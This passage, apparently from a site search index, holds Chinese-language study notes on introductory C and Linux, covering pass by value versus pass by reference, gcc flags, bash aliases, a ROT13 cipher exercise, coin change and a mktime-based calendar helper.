world!\"\n}\n</code></pre> <p>function prototype \u662f\u5bf9\u51fd\u6570\u7684\u4e00\u79cd\u58f0\u660e\uff0c\u5b83\u5411\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u51fd\u6570\u7684\u540d\u79f0\u3001\u53c2\u6570\u7c7b\u578b\u4ee5\u53ca\u8fd4\u56de\u7c7b\u578b\uff0c\u4f46\u4e0d\u5305\u542b\u51fd\u6570\u7684\u5b9e\u9645\u5b9e\u73b0\uff08\u51fd\u6570\u4f53\uff09\u3002\u51fd\u6570\u539f\u578b\u901a\u5e38\u51fa\u73b0\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6216\u5934\u6587\u4ef6\u4e2d\uff0c\u7528\u4e8e\u5728\u51fd\u6570\u8c03\u7528\u4e4b\u524d\u544a\u8bc9\u7f16\u8bd1\u5668\u51fd\u6570\u7684\u57fa\u672c\u4fe1\u606f\u3002</p> <pre><code>void foo();\nvoid foo(void);  // Not the same!\n</code></pre> <p>\u4ee5\u4e0a\u4e24\u884c\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u540e\u8005\u5411\u7f16\u8bd1\u5668\u8868\u660e\u6ca1\u6709\u53c2\u6570\u540e\u6709\u6548\u5173\u95ed\u4e86\u7c7b\u578b\u68c0\u67e5\uff0c\u56e0\u6b64\u63a8\u8350\u5728\u7a7a\u53c2\u6570\u65f6\u4f7f\u7528 void \u58f0\u660e\u3002</p>"},{"location":"cs/c/2.2/#increment-value-copy","title":"Increment &amp; Value Copy","text":"<pre><code>int a = 5;\nint b = a++;\n</code></pre> <p>a++ \u4e3a\u540e\u7f6e\u81ea\u589e\uff0creturn \u539f\u6570\u503c\u540e\u518d\u52a0 1\uff0c\u56e0\u6b64 a \u7ed3\u679c\u4e3a 6\uff0cb \u4e3a 5</p> <pre><code>int a = 5;\nint b = ++a;\n\n// b = 6, a =6\n</code></pre> <p>++a \u4e3a\u524d\u7f6e\u81ea\u589e\uff0c\u7ed9\u539f\u6570\u503c\u5148\u52a0\u4e0a 1 \u540e\u518d return \u8be5\u503c</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int a)\n{\n    a++;\n}\n\nint main(void)\n{\n    int i = 10;\n\n    increment(i);\n\n    printf(\"i == %d\\n\", i);  // 10\n}\n</code></pre> <p>Pass by value</p> <p>\u5728 C \u8bed\u8a00\u4e2d\uff0c\u5f53\u4f60\u5c06\u4e00\u4e2a\u53d8\u91cf\u4f20\u9012\u7ed9\u51fd\u6570\u65f6\uff0c\u51fd\u6570\u63a5\u6536\u7684\u662f\u8be5\u53d8\u91cf\u7684\u526f\u672c\uff0c\u800c\u4e0d\u662f\u8be5\u53d8\u91cf\u7684\u5f15\u7528\u3002\u8fd9\u610f\u5473\u7740\u5728\u51fd\u6570 increment \u4e2d\uff0ca \u662f i \u7684\u526f\u672c\uff0c\u5bf9 a \u7684\u4efb\u4f55\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd main \u51fd\u6570\u4e2d\u7684 i\u3002\u5e76\u4e14 void \u51fd\u6570\u672c\u8eab\u65e0\u6cd5 return \u4efb\u4f55\u503c\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a 10\uff0c\u8981\u60f3\u5728 void \u51fd\u6570\u7684\u65f6\u5019\u52a0 1 \u5c31\u8981\u7528\u5230\u6307\u9488\u6982\u5ff5\uff1a</p> <p>Pass by reference</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int *a) {\n    (*a)++;\n}\n\nint main(void) {\n    int i = 10;\n\n    increment(&amp;i);  // \u4f20\u9012 i \u7684\u5730\u5740\n\n    printf(\"i == %d\\n\", i);  // \u73b0\u5728\u8f93\u51fa\u662f 11\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4fee\u6539\u540e\u7684\u4ee3\u7801\u4e2d\uff0cincrement \u51fd\u6570\u63a5\u6536 i \u7684\u5730\u5740\uff0c\u5e76\u76f4\u63a5\u5bf9 i \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64 i \u7684\u503c\u4f1a\u88ab\u771f\u6b63\u589e\u52a0\uff0c\u8f93\u51fa\u4f1a\u662f 11\u3002</p>"},{"location":"cs/c/2.3/","title":"2.3 Linux Review","text":""},{"location":"cs/c/2.3/#fri-workshop-1","title":"Fri Workshop 1","text":"<p>Ubuntu \u4ecd\u7136\u662f\u76ee\u524d\u5de5\u4e1a\u754c\u5b89\u5168\u8003\u8651\u8303\u56f4\u5185\u6700\u4f18\u7684\u7cfb\u7edf\uff0c\u63d0\u4f9b LTS \u7248\u672c</p> <pre><code>cal 08 2024\nexpr 90 \\* 2\n</code></pre> <p>\u5176\u4e2d man \u624b\u518c\u4e0d\u540c\u7684 Linux \u53d1\u884c\u5546\u90fd\u7f16\u5199\u4e86\u81ea\u5df1\u7684\u7248\u672c\uff0c\u81ea\u5df1\u6311\u9009\u4e00\u4e2a</p> <p>\u5e38\u89c1 Linux \u547d\u4ee4\u53ef\u4ee5\u5728 Dive into Systems \u8fd9\u672c\u4e66\u4e2d\u627e\u5230</p>"},{"location":"cs/c/2.3/#unix-philosophy","title":"Unix Philosophy","text":"<p>\u4e3a\u4e00\u4e2a\u95ee\u9898\u5199\u4e00\u4e2a\u6700\u597d\u7684\u5de5\u5177\u53bb\u89e3\u51b3\uff0c\u89e3\u51b3\u5176\u4ed6\u95ee\u9898\u7684\u5de5\u5177\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u5de5\u5177\u4f5c\u4e3a\u7ec4\u4ef6\u89e3\u51b3\u95ee\u9898\uff0c\u548c Apple \u7684\u5f00\u53d1\u54f2\u5b66\u7c7b\u4f3c\u3002</p>"},{"location":"cs/c/2.3/#compiler","title":"Compiler","text":"<p>gcc \u662f\u7531 GNU \u9879\u76ee\u5f00\u53d1\u548c\u7ef4\u62a4\u7684\u7f16\u8bd1\u5668\u96c6\u5408, cc \u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u5b83</p> <pre><code>cc -std=c11 -Wall -Werror -o myprogram source.c\n</code></pre> <p><code>-Wall</code> \u542f\u7528\u6240\u6709\u5e38\u89c1\u7684\u7f16\u8bd1\u8b66\u544a\uff0c<code>-Werror</code> \u5c06\u6240\u6709\u8b66\u544a\u89c6\u4e3a\u9519\u8bef</p> <p>\u8be5\u6307\u4ee4\u7528 c11 \u6807\u51c6\u548c\u8b66\u544a\u89c4\u8303\u4e25\u683c\u8fdb\u884c\u7f16\u8bd1\u64cd\u4f5c\uff0c\u7528\u4e8e\u7f16\u5199\u9ad8\u8d28\u91cf\u4ee3\u7801</p>"},{"location":"cs/c/2.3/#labsheet-1","title":"Labsheet 1","text":"<p>\u8be5\u8bfe\u7a0b\u4f1a\u6709\u4e24\u4e2a Projects \u5360\u6bd4 50%</p> <p>Linux \u9996\u9009\u7684\u7f16\u8bd1\u5668\u662f gcc \u800c macOS \u4e3a clang \u5176\u4e3a 2007 \u5e74\u82f9\u679c\u81ea\u4e3b\u7814\u53d1\u7684\u7f16\u8bd1\u5668\u4f5c\u4e3a LLVM \u9879\u76ee\u4e4b\u4e00</p> <p>\u4e24\u8005\u90fd\u53ef\u4ee5\u88ab cc \u76f4\u63a5\u8c03\u7528\uff0c\u53ef\u5728 Terminal \u4e2d\u76f4\u63a5\u6267\u884c</p>"},{"location":"cs/c/2.3/#alias","title":"Alias","text":"<p>Linux \u4e2d\u6709\u4e00\u79cd\u547d\u4ee4\u5feb\u6377\u952e\u7684\u7528\u6cd5\uff0c\u548c Windows \u4e0b\u7684\u73af\u5883\u53d8\u91cf\u7c7b\u4f3c</p> <pre><code>vim ~/.bash_profile\n</code></pre> <pre><code>alias c=\"clear\"\nalias ll=\"ls -l\"\n</code></pre> <pre><code>source ~/.bash_profile\n</code></pre> <p>\u7136\u540e\u5728\u4e0b\u6b21\u767b\u9646\u4f1a\u8bdd\u65f6\uff0c\u7cfb\u7edf\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u522b\u540d\u673a\u5236\u7136\u540e\u751f\u6548</p>"},{"location":"cs/c/2.3/#rot3","title":"ROT3","text":"<p>\u7ef4\u62a4\u7ed3\u6784\u826f\u597d\u7684\u8ba1\u7b97\u673a\u5b66\u4e60\u76ee\u5f55\u5c42\u6b21\u7ed3\u6784\uff0c\u5212\u5206\u5de5\u4f5c\u903b\u8f91\u5206\u533a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u7f16\u8bd1\u671f\u95f4\u5982\u679c\u4e0d\u63d0\u4f9b <code>-o</code> \u53c2\u6570\u76f4\u63a5 <code>cc rotate.c</code>  \u4f1a\u591a\u51fa\u4e00\u4e2a a.out \u53ef\u6267\u884c\u6587\u4ef6\uff0c<code>a.out</code> \u4e3a\u9ed8\u8ba4\u540d</p> <p>\u4e3a\u4e86\u4e25\u683c\u7f16\u8bd1\u6240\u6709 C11 \u7a0b\u5e8f\uff0c\u6574\u4e2a Lab \u5c06\u91c7\u7528\u4ee5\u4e0b\u7f16\u8bd1\u53c2\u6570\u6267\u884c\uff1a</p> <pre><code>cc -std=c11 -Wall -Werror -o rotate rotate.c\n</code></pre> <p>\u7ed3\u5408 vim \u63d0\u4f9b\u7684 alias \u529f\u80fd\uff0c\u53ef\u901a\u8fc7\u7f16\u8f91 <code>~/.bash_profile</code> \u6dfb\u52a0\u4ee5\u4e0b\u884c\u7b80\u5316\u7f16\u8bd1\u6d41\u7a0b</p> <pre><code>alias mycc=\"cc -std=c11 -Wall -Werror\"\nsource ~/.bash_profile\n</code></pre> <p>\u65e5\u540e\u7684\u7f16\u8bd1\u6d41\u7a0b\u5c31\u76f4\u63a5\u80fd\u7b80\u5316\u6210\uff1a</p> <pre><code>mycc -o rotate rotate.c\n</code></pre>"},{"location":"cs/c/2.3/#linux-commands","title":"Linux Commands","text":"<p>\u9664\u53bb\u5e38\u89c1\u6eda\u74dc\u70c2\u719f\u7684\u6307\u4ee4\u6a21\u5f0f\uff1a</p> <pre><code>man -k vim\n# -k \u5217\u51fa\u6240\u6709 vim \u7b80\u8ff0\n\nls -lt \n# \u6309\u7167\u65f6\u95f4\u6392\u5e8f\n\nls -lR\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u5217\u4e3e\n\ncp -R olddir newdir\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u62f7\u8d1d\n\ndu -sh dirname\n# \u7528\u4eba\u6027\u5316\u683c\u5f0f\u663e\u793a\u8be5\u6587\u4ef6\u5939\u78c1\u76d8\u4f7f\u7528\u72b6\u51b5\n\ncat -s filename\n# \u53bb\u7a7a\u884c\u67e5\u770b\u6587\u4ef6\n\nhead -3 filename \nhead -c 100 filename\ntail -3 filename\ntail -c 100 filename\n# \u4ece\u6587\u4ef6\u5f00\u5934\u6216\u7ed3\u5c3e\u9605\u8bfb\u7279\u5b9a\u884c\u6216\u5b57\u6570\n\nwc -l filename\n# \u9ed8\u8ba4\u662f\u663e\u793a\u5b57\u6570\u3001\u5355\u8bcd\u6570\u548c\u884c\u6570\uff0c-l \u662f\u6587\u4ef6\u884c\u6570\n\ngrep pattern filename\ngrep -c pattern filename\n# \u663e\u793a\u5339\u914d\u8fd9\u79cd\u6a21\u5f0f\u7684\u6b21\u6570\ngrep -i pattern filename\n# \u5ffd\u7565\u6587\u4ef6\u5927\u5c0f\u5199\n\nps aux\n# \u6240\u6709\u8fdb\u7a0b\u548c\u5c5e\u6027\n</code></pre>"},{"location":"cs/c/2.3/#1-integer-arithmetic","title":"1. Integer Arithmetic","text":"<p>\u6fb3\u5927\u5229\u4e9a\u8d85\u5e02\u627e\u96f6\u5c0f\u7a0b\u5e8f\uff0c\u8f93\u5165\u5546\u54c1\u4ef7\u683c\u8f93\u51fa\u652f\u4ed8 100 \u5206\u540e\u5f97\u5230\u7684\u627e\u96f6\u4fe1\u606f\uff0c\u627e\u96f6\u786c\u5e01\u79cd\u7c7b\u6709 1c 2c 5c 10c 20c 50c</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int const argc, char *argv[]) {\n    // argc \u4ee3\u8868\u7684\u53c2\u6570\u6570\u91cf\uff0cargv \u50a8\u5b58\u6240\u6709\u53c2\u6570\n    // %dn means a integer with a line break\n    if (argc != 2) {\n        printf(\"Format Error, please use ./change cents.\\n\");\n        return 0;\n    }\n\n    int const price = atoi(argv[1]);\n\n    if (price &lt;= 0 || price &gt; 100) {\n        printf(\"Data Type Error, please use int and the price needs to &lt;= 100.\\n\");\n        return 0;\n    }\n\n    int change = 100 - price;\n    int const coin_50 = change / 50;\n    change = change % 50;\n    int const coin_20 = change / 20;\n    change = change % 20;\n    int const coin_10 = change / 10;\n    change = change % 10;\n    int const coin_5 = change / 5;\n    change = change % 5;\n    int const coin_2 = change / 2;\n    change = change % 2;\n    int const coin_1 = change / 1;\n    printf(\"%d 50c, %d 20c, %d 10c, %d 5c, %d 2c, %d 1c for changes.\\n\", coin_50, coin_20,\n    coin_10, coin_5, coin_2, coin_1);\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u662f\u8d2a\u5fc3\u7b97\u6cd5\u548c\u52a8\u6001\u89c4\u5212\u5e38\u8003\u7684\u9898\uff0c\u4f46\u662f\u5728\u4e0d\u7528\u7b97\u6cd5\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u624b\u52a8\u66f4\u65b0\u4f59\u989d\u5e76\u624b\u52a8\u964d\u5e8f\u53d6\u4f59\u6570\u6700\u7ec8\u6574\u4f53\u5c06\u7b54\u6848\u7b54\u5e94\u51fa\u6765\uff1b\u7a0b\u5e8f\u5728\u7f16\u5199\u8fc7\u7a0b\u4e2d\u7406\u89e3\u4e86 C \u7684\u4e00\u4e9b\u7ec6\u8282\uff1a</p> <ol> <li> <p><code>printf</code> \u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u6709\u7684\u62fc\u63a5\u90fd\u662f\u7528 % \u5f00\u5934\u7684\u66ff\u6362\u7b26\u62fc\u63a5\u4e0a\u53bb</p> </li> <li> <p>argc \u4e3a arg count \u4e5f\u5c31\u662f\u6570\u91cf\uff0c./main \u7b97 argv[0] \u56e0\u6b64\u7b97\u4e24\u4e2a</p> </li> <li> <p>argv \u4e3a char \u6570\u7ec4, char * \u4e3a\u6307\u9488\u6307\u5411\u5176\u4e2d\u7684\u4e00\u4e2a char</p> </li> <li> <p>In C, you cannot directly cast a string (which argv[1] is, as a char *) to an int because a string is a sequence of characters (a pointer) and not directly an integer value. </p> </li> </ol> <p>\u7531\u4e8e\u76f4\u63a5\u5185\u5b58\u7ba1\u7406\u548c\u5e95\u5c42\u7684\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u8bbe\u8ba1\uff0cC \u8bed\u8a00\u5e76\u4e0d\u652f\u6301\u50cf Python \u4e00\u6837\u76f4\u63a5\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u9700\u8981\u7528 atoi \u8fd9\u4e2a\u5305\u5c06 pointer \u627e\u5230\u540e\u6210\u529f\u8f6c\u6362\u3002<code>char str[] = \"Hello, World!\";</code> \u4e3a\u5b57\u7b26\u4e32\u6570\u636e\u7c7b\u578b\u58f0\u660e\u65b9\u5f0f\u3002 </p>"},{"location":"cs/c/2.3/#2-call-system-date-function","title":"2. Call system date function","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    printf(\"%d\",system(\"date\"));\n    return 0;\n}\n</code></pre> <p>\u8c03\u7528\u7cfb\u7edf\u4f9d\u7136\u82f1 <code>stdlib</code> \u5305\u4e2d\u7684 <code>system</code> \u51fd\u6570\uff0cdate \u7684\u8f93\u51fa\u6709\u610f\u601d\u7684\u662f\u6574\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u8f93\u51fa\u540e\u4f1a\u7b54\u5e94\u4e00\u4e2a 0, \u8fd9\u662f\u4ee3\u8868 the date command executed successfully with an exit status of 0.</p>"},{"location":"cs/c/2.3/#4-array","title":"4. Array","text":"<p>\u968f\u673a\u5927\u4e50\u900f\u6d17\u724c\u7a0b\u5e8f</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main() {\n    srand(time(NULL));\n    int result[6];\n    for (int i = 0; i &lt; 6; i++) {\n        int const ranNum = rand() % 100;\n        result[i] = ranNum;\n        printf(\"%d\\n\", result[i]);\n    }\n}\n</code></pre> <p>\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u6709\u771f\u968f\u673a\u6570\u548c\u4f2a\u968f\u673a\u6570\u7684\u6982\u5ff5\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6bcf\u6b21\u751f\u6210\u7684\u6570\u4e3a\u771f\u968f\u673a\uff0c\u5bfc\u5165 <code>time(NULL)</code> \u8fd4\u56de\u4e00\u4e2a time_t \u7c7b\u578b\u7684\u503c\uff0c\u8868\u793a\u5f53\u524d\u65f6\u95f4\u4e0e Unix \u7eaa\u5143 (1970\u5e741\u67081\u65e500:00:00 UTC) \u7684\u79d2\u5dee\u503c\uff0c\u6570\u636e\u7c7b\u578b\u4e3a long int \u6253\u5370\u7528 <code>%ld</code>\u3002\u8fd9\u6837\u6bcf\u4e00\u6b21\u83b7\u53d6\u968f\u673a\u6570\u7684\u65f6\u5019\uff0c\u751f\u6210\u79cd\u5b50\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c<code>%</code> \u80fd\u591f\u4fdd\u8bc1\u65e0\u8bba\u591a\u5927\u7684\u968f\u673a\u6570\u6700\u7ec8\u90fd\u80fd\u63a7\u5236\u5728 0 ~ 100 \u7684\u8303\u56f4\u4e4b\u5185\u3002</p>"},{"location":"cs/c/2.3/#tasks","title":"Tasks","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/2.3/#rot-13-rot-3","title":"ROT 13 -&gt; ROT 3","text":"<p>\u7b2c 9 \u884c\u7684 13 \u6539\u4e3a 3, 45 \u884c\u52a0\u4e2a\u6362\u884c\u7b26</p>"},{"location":"cs/c/2.3/#position","title":"POSITION","text":"<pre><code>printf(\"%c, %c\\n\", argvalue[1][i], rotate(argvalue[1][i]));\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 char \u7528\u7684\u89e3\u6790\u7b26\u53f7\u4e3a <code>%c</code> </p>"},{"location":"cs/c/2.3/#original-char","title":"ORIGINAL CHAR","text":"<pre><code>printf(\"%c, %c, %d\\n\", argvalue[1][i], rotate(argvalue[1][i]), i + 1);\n</code></pre>"},{"location":"cs/c/2.3/#deal-with-capital-char","title":"DEAL WITH CAPITAL CHAR","text":"<pre><code>char rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    return ('A' + (c - 'A' + ROT) % 26);\n}\n</code></pre>"},{"location":"cs/c/2.3/#explanation","title":"Explanation","text":"<pre><code>#include &lt;stdio.h&gt;\n</code></pre> <p>\u4e3b\u8981\u5728\u4ee3\u7801\u4e2d\u652f\u6301 <code>fprintf</code> <code>printf</code> \u4e24\u4e2a\u51fd\u6570\uff0cfprintf \u80fd\u591f\u5b9a\u4e49\u6307\u5b9a\u7684\u8f93\u51fa\u6d41\uff0c\u5728\u5185\u5b58\u4e2d\u6253\u5370\uff0c\u53ef\u4ee5\u5728 buffer \u7f51\u7edc\u4e2d\u64cd\u4f5c\u7b49\u7b49</p> <pre><code>int fprintf(FILE *stream, const char *format, ...);\n</code></pre> <pre><code>fprintf(stderr, \"An error occurred: %s\\n\", \"File not found\");\n</code></pre> <p>\u4ee3\u7801\u4e2d\u5b9a\u4e49\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u4e3a\u6b64\u63d0\u793a</p> <p>\u6807\u51c6\u6d41\uff1a</p> <ul> <li>stderr\uff1a\u6807\u51c6\u9519\u8bef\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002</li> <li>stdout\uff1a\u6807\u51c6\u8f93\u51fa\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u6b63\u5e38\u8f93\u51fa\u3002</li> <li> <p>stdin\uff1a\u6807\u51c6\u8f93\u5165\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u8f93\u5165\u3002</p> </li> <li> <p>scanf\uff1a\u7528\u4e8e\u4ece\u6807\u51c6\u8f93\u5165\u6d41\u8bfb\u53d6\u683c\u5f0f\u5316\u8f93\u5165\u3002</p> </li> <li> <p>fopen\uff1a\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u4ee5\u8fdb\u884c\u8bfb\u53d6\u6216\u5199\u5165\u3002</p> </li> <li> <p>fclose\uff1a\u7528\u4e8e\u5173\u95ed\u4e00\u4e2a\u6253\u5f00\u7684\u6587\u4ef6\u3002</p> </li> <li> <p>fgets\uff1a\u7528\u4e8e\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u53d6\u4e00\u884c\u6587\u672c\u3002</p> </li> </ul> <pre><code>#include &lt;stdlib.h&gt;\n\n// \u7528\u4e8e\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\nexit(EXIT_SUCCESS);\nexit(EXIT_FAILURE);\n</code></pre> <p>\u662f C \u8bed\u8a00\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u7528\u4e8e\u7ec8\u6b62\u5f53\u524d\u7a0b\u5e8f\u5e76\u8fd4\u56de\u4e00\u4e2a\u72b6\u6001\u7801\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <pre><code>#include &lt;string.h&gt;\n\n// strlen() \u51fd\u6570\u8c03\u7528\u8ba1\u7b97 char \u5b57\u7b26\u957f\u5ea6\n</code></pre> <pre><code>#include &lt;ctype.h&gt;\n\n// islower() \n</code></pre> <p>ctype \u4e3b\u8981\u7528\u4e8e\u5904\u7406\u5b57\u7b26\u7684\u5206\u7c7b\u548c\u8f6c\u6362\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\uff0c\u7528\u4e8e\u68c0\u67e5\u5b57\u7b26\u7684\u7c7b\u578b\uff08\u5982\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u767d\u5b57\u7b26\u7b49\uff09\u4ee5\u53ca\u5c06\u5b57\u7b26\u8fdb\u884c\u5927\u5c0f\u5199\u8f6c\u6362\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"cs/c/2.4/","title":"2.4 MyCal","text":""},{"location":"cs/c/2.4/#fri-workshop-2","title":"Fri Workshop 2","text":"<p>\u4e3b\u8981\u65e8\u5728\u521b\u5efa\u4e00\u4e2a cal \u4e00\u6837\u7684 c \u7f16\u5199\u7684\u65e5\u5386\u7a0b\u5e8f\uff0c\u7528 double for loop \u6253\u5370 4 \u6708\u6216 8 \u6708\u7684\u65e5\u5386\uff0c\u4ece\u76f4\u63a5\u8c03\u7528\u7cfb\u7edf\u7684 cal \u5230\u81ea\u5df1\u7f16\u5199\uff0c\u719f\u6089\u4e4b\u524d\u8bfe\u7a0b\u7684\u77e5\u8bc6\u70b9\u3002</p> <p>\u8be5\u7a0b\u5e8f\u7684\u6838\u5fc3\u7b97\u6cd5\u4e00\u5171\u6709\u4e24\u4e2a\uff1a</p> <ol> <li> <p>\u4e8c\u7ef4\u77e9\u9635\u7684\u5c4f\u5e55\u663e\u793a</p> </li> <li> <p>\u5982\u4f55\u7cbe\u786e\u663e\u793a\u65e5\u671f\u5c5e\u4e8e\u661f\u671f\u51e0</p> </li> </ol> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u4e8c\u7ef4\u77e9\u9635\u53ef\u4ee5\u7528\u5d4c\u5957 for loop \u89e3\u51b3\uff0c\u800c\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\u53ef\u6839\u636e\u53c2\u6570\u7684\u8f93\u5165\u5355\u72ec\u5904\u7406\uff0c\u7b2c\u4e8c\u884c\u53ef\u5355\u72ec\u6253\u5370\uff0csolution \u4e2d\u5c06\u5bfb\u627e\u6307\u5b9a\u6708\u4efd\u7684\u7b2c\u4e00\u5929\u662f\u661f\u671f\u51e0\u7684\u7b97\u6cd5\u5355\u72ec\u63d0\u70bc\u6210\u4e00\u4e2a\u6587\u4ef6\u63d0\u4f9b\u7ed9\u4e3b\u7a0b\u5e8f <code>#include</code></p>"},{"location":"cs/c/2.4/#first_day_of_monthc","title":"first_day_of_month.c","text":"<pre><code>#include &lt;time.h&gt;\n#include &lt;string.h&gt;\n\n//  written by ...\n\n//  PROVIDED WITHOUT MUCH EXPLANATION YET!\n\n//  RETURNS  0=Sun, 1=Mon, .....\n//\nint first_day_of_month(int month, int year)\n{\n    struct tm tm;\n\n//  SET ALL FIELDS OF tm TO ZERO TO MAKE SOME FIELDS 'UNKNOWN'\n    memset(&amp;tm, 0, sizeof(tm));\n\n//  INITIALIZE THE FILEDS THAT WE ALREADY KNOW\n    tm.tm_mday  = 1;\n    tm.tm_mon   = month-1;              // 0=Jan, 1=Feb, ....\n    tm.tm_year  = year-1900;\n\n//  ASK THE POSIX FUNCTION mktime TO DETERMINE THE 'UNKNOWN' FIELDS\n//  See: http://pubs.opengroup.org/onlinepubs/9699919799/\n    mktime(&amp;tm);\n\n//  RETURN THE INTEGER MONTH VALUE\n    return tm.tm_wday;                  // 0=Sun, 1=Mon, .....\n}\n</code></pre>"},{"location":"cs/c/2.4/#analyzation","title":"Analyzation","text":""},{"location":"cs/c/2.4/#mktime","title":"mktime","text":"<p>\u7b97\u6cd5\u7684\u6838\u5fc3\u5de5\u5177\u4e3a\u4e00\u4e2a\u53eb mktime \u7684\u51fd\u6570\uff1a</p> <p>mktime \u51fd\u6570\u4f7f\u7528 struct tm \u4e2d\u63d0\u4f9b\u7684\u5b57\u6bb5\u6765\u8ba1\u7b97\u65f6\u95f4\uff0c\u5e76\u5c06\u90a3\u4e9b\u6ca1\u6709\u660e\u786e\u6307\u5b9a\u7684\u5b57\u6bb5\uff08\u4f8b\u5982 tm_wday \u548c tm_yday\uff09\u8ba1\u7b97\u51fa\u6765\u3002\u5982\u679c struct tm \u4e2d\u7684\u67d0\u4e9b\u5b57\u6bb5\u672a\u521d\u59cb\u5316\u4e14\u5305\u542b\u5783\u573e\u503c\uff0cmktime \u53ef\u80fd\u4f1a\u4ea7\u751f\u9519\u8bef\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u4f7f\u7528 memset \u53ef\u4ee5\u907f\u514d\u8fd9\u4e9b\u6f5c\u5728\u7684\u95ee\u9898\u3002</p>"},{"location":"cs/c/2.4/#struct","title":"struct","text":"<p>struct 